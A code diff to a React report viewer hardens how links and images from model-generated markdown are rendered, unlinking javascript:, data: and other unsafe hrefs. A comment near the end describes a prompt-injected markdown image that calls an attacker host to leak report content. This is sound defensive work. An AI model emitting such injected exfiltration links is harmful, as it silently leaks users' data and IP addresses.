@@ -43,6 +43,9 @@ export function CiteProvider({
 /** DOM id of a source row in the Sources panel. */
 export const sourceDomId = (prefix: string, n: number) => `${prefix}-src-${n}`;
 
+/** An absolute http(s) URL with a host ("https://host…"; not "https:///host" or "https:\\host"). */
+const ABSOLUTE_HTTP = /^https?:\/\/[^\s/\\]/i;
+
 // ---------- Citation chip with popover ----------
 
 function Cite({ n }: { n: number }) {
@@ -95,7 +98,7 @@ function Cite({ n }: { n: number }) {
 
   const domain = sourceDomain(src);
   const popId = `cite-${id.replace(/:/g, "")}`;
-  const external = !ctx?.jump && src.url && /^https?:\/\//i.test(src.url) ? src.url : null;
+  const external = !ctx?.jump && src.url && ABSOLUTE_HTTP.test(src.url) ? src.url : null;
   return (
     <sup className={s.sup}>
       <a
@@ -151,6 +154,16 @@ function Cite({ n }: { n: number }) {
 
 const cell = { whiteSpace: "normal", verticalAlign: "top", minWidth: 110 } as const;
 
+/**
+ * Whether a link in report markdown stays a link: an absolute http(s) URL, or an in-page
+ * #anchor (footnotes). Anything else from model output — protocol-relative "//host",
+ * "javascript:", "data:", "mailto:", relative paths, or an href the URL transform emptied —
+ * is shown as its text. (The executor already unlinks domains that aren't evidence.)
+ */
+export function isLinkableHref(href: string | null | undefined): href is string {
+  return !!href && (ABSOLUTE_HTTP.test(href) || href.startsWith("#"));
+}
+
 const components: Components = {
   table: ({ node: _node, ...props }) => (
     <div className="tw not-prose" style={{ margin: "16px 0" }}>
@@ -159,9 +172,12 @@ const components: Components = {
   ),
   th: ({ node: _node, style, ...props }) => <th style={{ ...cell, ...style }} {...props} />,
   td: ({ node: _node, style, ...props }) => <td style={{ ...cell, ...style }} {...props} />,
-  a: ({ node: _node, href, ...props }) => (
-    <a href={href} {...props} {...(href && /^https?:/i.test(href) ? { target: "_blank", rel: "noopener noreferrer" } : {})} />
-  ),
+  a: ({ node: _node, href, ...props }) =>
+    isLinkableHref(href) ? (
+      <a href={href} {...props} {...(href.startsWith("#") ? {} : { target: "_blank", rel: "noopener noreferrer" })} />
+    ) : (
+      <span>{props.children}</span>
+    ),
   // Never load images from model output: the browser fetches an image as soon
   // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
   // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
